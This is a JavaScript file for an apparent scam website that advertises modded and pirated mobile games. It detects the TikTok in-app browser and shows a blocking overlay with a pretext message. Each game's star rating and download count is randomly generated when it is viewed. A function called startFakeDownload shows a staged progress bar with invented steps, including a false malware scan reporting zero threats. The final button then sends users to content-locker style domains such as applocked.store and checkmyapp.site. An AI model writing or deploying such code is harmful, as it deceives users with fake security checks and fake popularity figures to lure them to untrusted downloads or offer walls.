/**
 * --------------------------------
 * 0. TikTok Browser Detector (The Ultimate Fix)
 * --------------------------------
 */

// دالة تنشئ السهم الأحمر
function createTikTokArrow() {
    const arrow = document.createElement('div');
    arrow.className = 'tiktok-arrow';
    // رمز سهم علوي مائل Unicode
    arrow.innerHTML = '&#8599;';
    document.body.appendChild(arrow);
    return arrow;
}

(function () {
    const ua = navigator.userAgent || navigator.vendor || window.opera;

    // التحقق من تيك توك وتطبيقات ByteDance الأخرى
    const isTikTok = (ua.indexOf("TikTok") > -1) ||
        (ua.indexOf("musical_ly") > -1) ||
        (ua.indexOf("ByteDance") > -1);

    if (isTikTok) {
        // ننتظر تحميل HTML ثم نظهر الحظر
        window.addEventListener('DOMContentLoaded', () => {
            const overlay = document.getElementById("tiktok-overlay");
            const arrow = createTikTokArrow(); // إنشاء وإظهار السهم

            if (overlay) {
                overlay.style.display = "flex"; // إظهار الشاشة
                document.body.style.overflow = "hidden"; // منع التمرير
                arrow.style.display = "block"; // إظهار السهم

                // تحديث النص لضمان أنه بالإنجليزية وأن محتواه صحيح
                document.querySelector('.tiktok-content h2').textContent = "BROWSER NOT SUPPORTED";
                document.querySelector('.tiktok-content p').textContent = "TikTok's internal browser may block secure downloads.";
            }
        });
    }
})();

// دالة نسخ الرابط للمستخدم المحظور
function copyCurrentUrl() {
    navigator.clipboard.writeText(window.location.href).then(() => {
        const btn = document.querySelector('.copy-btn');
        btn.innerHTML = '<i class="fas fa-check"></i> Link Copied!';
        setTimeout(() => {
            btn.innerHTML = '<i class="fas fa-copy"></i> Copy Link Instead';
        }, 2000);
    });
}


/**
 * --------------------------------
 * 1. بيانات الألعاب
 * --------------------------------
 */
const games = [
    {
        id: 1,
        name: "OOTP Baseball 27 Go MOD APK",
        image: "https://static.modded-1.com/play-lh.googleusercontent.com/Lc2nMkeVkGGYjbx4eeb05-vwhTJziUUEJSxzuiYwOIJyUeK_KJDlUkMsy5j-z2F1B2FK1xqtYl0kKKTkpvW5IA=-rw",
        linkAndroid: "https://authenticateapp.online/cl/i/o4ee1d",
        linkIOS: "",
        downloads: "1M+",
        type: "MOD"
    },
    {
        id: 2,
        name: "Dominó Vamos",
        image: "https://apk.dog/images:bz00dWx5djkmbD0xeHdwJmg9anBnJmY9Z2xtJmk9OTA",
        linkAndroid: "https://checkmyapp.store/cl/i/o4e674",
        linkIOS: "",
        downloads: "11K+",
        type: "MOD"
    },
    {
        id: 3,
        name: "Pokemon TCG Pocket",
        image: "https://imgs.search.brave.com/t-XSlcp5_PJRdsHi3xaD-5e-zUwqEBabcbhTccEPw0U/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly90Y2dw/b2NrZXQucG9rZW1v/bi5jb20vX2ltYWdl/cy9hbm5vdW5jZW1l/bnQvY2FyZHNwcmVh/ZF9oZWFkZXIucG5n",
        linkAndroid: "https://confirmapp.site/cl/i/w66l61",
        linkIOS: "",
        downloads: "5K+",
        type: "MOD"
    },
    {
        id: 4,
        name: "NBA 2K26 arcade edition",
        image: "https://is1-ssl.mzstatic.com/image/thumb/PurpleSource221/v4/f6/d1/5f/f6d15fad-828c-2c49-d74c-865f10c728b9/NBA2K25_MTM_App-Store-Screenshots_2796x1290_7_EN.jpg/313x144bb.webp",
        linkAndroid: "https://applocked.store/cl/i/l77kdg",
        linkIOS: "https://applocked.store/cl/i/347216",
        downloads: "7M+",
        type: "MOD"
    },
    {
        id: 5,
        name: "GTA San Andreas",
        image: "https://gtandreaspro.com/wp-content/uploads/2024/11/GTA-San-Logo.webp",
        linkAndroid: "https://applocked.store/cl/i/pqqok2",
        linkIOS: "https://applocked.space/cl/i/7jjdmg",
        downloads: "15M+",
        type: "MOD"
    },
    {
        id: 6,
        name: "Marvels Spider-Man: Miles Morales APK",
        image: "https://m.media-amazon.com/images/M/MV5BZjhiMTJhZjUtOTZkNC00OGVkLThkNjctODQ4MGYzOWU3NGVkXkEyXkFqcGdeQVRoaXJkUGFydHlJbmdlc3Rpb25Xb3JrZmxvdw@@._V1_QL75_UX500_CR0,0,500,281_.jpg",
        linkAndroid: "https://applocked.store/cl/i/7jjnq9",
        linkIOS: "https://applocked.store/cl/i/7jjnq9",
        downloads: "9M+",
        type: "mobile"
    },
    {
        id: 7,
        name: "Hitman: Absolution",
        image: "https://imgs.search.brave.com/ul4l8ZaR0IWfHuQuUquoARQKpbY5Dj3tNq7y5Jb5WIg/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9tb2Ro/ZWxsby5jb20vdXBs/b2Fkcy8yMDI1LzEw/L2hpdG1hbi1hYnNv/bHV0aW9uLXRodW1i/bmFpbC5qcGc",
        linkAndroid: "https://lockedapp.store/cl/i/277746",
        linkIOS: "https://lockedapp.space/cl/i/exxxml",
        downloads: "1M+",
        type: "mobile"
    },
    {
        id: 8,
        name: "Resident Evil 4",
        image: "https://imgs.search.brave.com/7mWKand61iswNvsINpntg6meaKAyEeztg8EbOUvGKes/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9zdG9y/ZS1pbWFnZXMucy1t/aWNyb3NvZnQuY29t/L2ltYWdlL2FwcHMu/NjQ1MzAuMTQwNjgz/MDI5MzM4OTI2NzAu/YzdiY2U5OGEtZmRm/Yi00YzkzLTlhNTgt/NWRjZWU5NWVjNWQ3/LmVkN2Y3ZWIxLTJj/ZmUtNDQxMy1iMmI3/LTYzYzk0ZmVlMmQw/OT9xPTkwJnc9NDgw/Jmg9Mjcw",
        linkAndroid: "https://checkmyapp.site/cl/i/j77lov",
        linkIOS: "",
        downloads: "5M+",
        type: "CLOUD"
    },
    {
        id: 9,
        name: "poppy playtime chapter 5",
        image: "https://imgs.search.brave.com/d9r7-u22-8FeysbCHQotNCmySiECMP3yu0TLp4JC8bk/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9wcmV2/aWV3LnJlZGQuaXQv/aXMtY2hhcHRlci01/LXBvcHB5LXBsYXl0/aW1lcy1lbmQtdjAt/cDNhdnVmMHJhNnNm/MS5qcGVnP3dpZHRo/PTY0MCZjcm9wPXNt/YXJ0JmF1dG89d2Vi/cCZzPTlmMmRjZDFm/ZTZhZDJiNzYxNzc5/MjRlZTJhNGNmYTNl/ZmJlNTAwYjc",
        linkAndroid: "https://checkmyapp.site/cl/i/5nn1ow",
        linkIOS: "",
        downloads: "30k+",
        type: "mobile"
    },
    {
        id: 10,
        name: "Geometry Dash Meltdown",
        image: "https://an1.com/uploads/screenshots/2768/thumbs/geometry-dash-meltdown-772028.webp",
        linkAndroid: "https://checkmyapp.site/cl/i/o44g7r",
        linkIOS: "",
        downloads: "4M+",
        type: "MOD"
    },
];

// دالة توليد النجوم
function getStars(rating) {
    const fullStars = Math.round(parseFloat(rating));
    let stars = '';
    for (let i = 0; i < 5; i++) stars += (i < fullStars) ? '★' : '☆';
    return stars;
}

// Helper to format large numbers (e.g., 50000 -> 50K, 1500000 -> 1.5M)
function formatNumber(num) {
    if (num >= 1000000) return (num / 1000000).toFixed(1) + 'M';
    if (num >= 1000) return (num / 1000).toFixed(1) + 'K';
    return num.toString();
}

// عرض الألعاب
function renderGames() {
    const container = document.getElementById('games-container');
    if (!container) return;
    const fragment = document.createDocumentFragment();

    games.forEach(game => {
        const badgeClass = game.type === 'MOD' ? 'mod-badge' : 'mobile-badge';

        const div = document.createElement('div');
        div.innerHTML = `
            <div class="game-card scroll-reveal" onclick="openModal(${game.id})" data-title="${game.name.toLowerCase()}" data-type="${game.type.toLowerCase()}">
                <div class="game-link skeleton-box"> 
                    <img src="${game.image}" alt="${game.name}" class="skeleton-img" loading="lazy" onload="this.classList.add('loaded'); this.parentElement.classList.remove('skeleton-box');"> 
                    <span class="type-badge ${badgeClass}">${game.type}</span>
                    <span class="updated-badge"><i class="fas fa-check-circle"></i> Updated 2026</span>
                </div>
                <div class="game-info">
                    <p class="game-name" style="margin-bottom: 0;">${game.name}</p>
                </div>
            </div>
        `;
        fragment.appendChild(div.children[0]);
    });
    container.appendChild(fragment);
    observeElements();
}

/**
 * --------------------------------
 * Modal Logic (Game Details)
 * --------------------------------
 */
const modal = document.getElementById('game-modal');
const loadingModal = document.getElementById('loading-modal');

window.openModal = function (id) {
    const game = games.find(g => g.id === id);
    if (!game) return;

    // Generate Random Rating (4.0 -> 5.0)
    const rating = (Math.random() * (5.0 - 4.0) + 4.0).toFixed(1);

    // Generate Random Downloads (50,000 to 15,000,000)
    const rawDownloads = Math.floor(Math.random() * (15000000 - 50000 + 1) + 50000);
    const downloadsText = formatNumber(rawDownloads) + "+";

    document.getElementById('modal-game-image').src = game.image;
    document.getElementById('modal-game-name').textContent = game.name;
    document.getElementById('modal-game-rating').innerHTML = `<span style="color: #ffcc00;">${getStars(rating)}</span> <span style="font-size: 0.8rem; color:#aaa;">(${rating})</span>`;
    document.getElementById('modal-game-downloads').innerHTML = `<i class="fas fa-download"></i> ${downloadsText}`;

    const setupBtn = (btnId, link) => {
        const btn = document.getElementById(btnId);
        if (link) {
            btn.style.display = 'flex';
            btn.onclick = (e) => {
                e.preventDefault();
                closeModal();
                startFakeDownload(link);
            };
        } else {
            btn.style.display = 'none';
        }
    };

    setupBtn('download-android', game.linkAndroid);
    setupBtn('download-ios', game.linkIOS);

    modal.style.display = 'block';
};

window.closeModal = function () {
    modal.style.display = 'none';
};


/**
 * --------------------------------
 * Trustworthy Loading Experience
 * --------------------------------
 */
window.startFakeDownload = function (redirectLink) {
    loadingModal.style.display = 'flex';

    const loadingContent = loadingModal.querySelector('.loading-content');
    loadingContent.innerHTML = `
        <div class="secure-header"><i class="fas fa-shield-alt"></i> Secure Connection</div>
        <div class="progress-bar-container">
            <div class="progress-bar-fill" id="progress-fill" style="width: 0%;"></div>
        </div>
        <div class="percentage-text" id="progress-percentage">0%</div>
        <p id="loading-status" class="loading-console">Initializing secure protocol...</p>
    `;

    const pct = document.getElementById('progress-percentage');
    const status = document.getElementById('loading-status');
    const fill = document.getElementById('progress-fill');

    const steps = [
        "Allocating server node...",
        "Bypassing cache...",
        "Establishing P2P handshake...",
        "Validating package integrity...",
        "Scanning for malware (0 threats)...",
        "Generating secure token...",
        "Finalizing file system..."
    ];

    let progress = 0;
    const interval = setInterval(() => {
        progress += Math.floor(Math.random() * 8) + 2;
        if (progress > 100) progress = 100;

        pct.textContent = `${progress}%`;
        fill.style.width = `${progress}%`;

        // Update text logs dynamically
        const stepIndex = Math.min(Math.floor((progress / 100) * steps.length), steps.length - 1);
        status.textContent = steps[stepIndex];

        if (progress >= 100) {
            clearInterval(interval);

            // Show Download Button without redirecting the main window
            loadingContent.innerHTML = `
                <div style="font-size: 3rem; color: #00ff88; margin-bottom: 1rem;"><i class="fas fa-check-circle"></i></div>
                <h3 style="color: #fff; margin-bottom: 0.5rem;">File Ready</h3>
                <p style="color: #aaa; margin-bottom: 1.5rem; font-size: 0.9rem;">Verifications passed natively. No installation required.</p>
                <a href="${redirectLink}" target="_self" class="final-download-btn">DOWNLOAD NOW <i class="fas fa-download"></i></a>
            `;

            // Auto close modal when clicking the link, don't close the current site.
            const btn = loadingContent.querySelector('.final-download-btn');
            btn.onclick = () => {
                setTimeout(() => loadingModal.style.display = 'none', 500);
            };
        }
    }, 300);
};

// Scroll Reveal Observer
function observeElements() {
    const observer = new IntersectionObserver(entries => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('visible');
                observer.unobserve(entry.target);
            }
        });
    });
    document.querySelectorAll('.scroll-reveal').forEach(el => observer.observe(el));
}

// Live Search Filter
function initSearch() {
    const searchInput = document.getElementById('game-search');
    const noResults = document.getElementById('no-results-msg');

    if (!searchInput) return;

    searchInput.addEventListener('input', (e) => {
        const query = e.target.value.toLowerCase().trim();
        const cards = document.querySelectorAll('.game-card');
        let hasVisibleCards = false;

        cards.forEach(card => {
            const title = card.getAttribute('data-title') || '';
            const type = card.getAttribute('data-type') || '';

            if (title.includes(query) || type.includes(query)) {
                card.style.display = 'block';
                hasVisibleCards = true;
            } else {
                card.style.display = 'none';
            }
        });

        if (noResults) {
            noResults.style.display = hasVisibleCards ? 'none' : 'flex';
        }
    });
}

document.addEventListener('DOMContentLoaded', () => {
    renderGames();
    initSearch();
});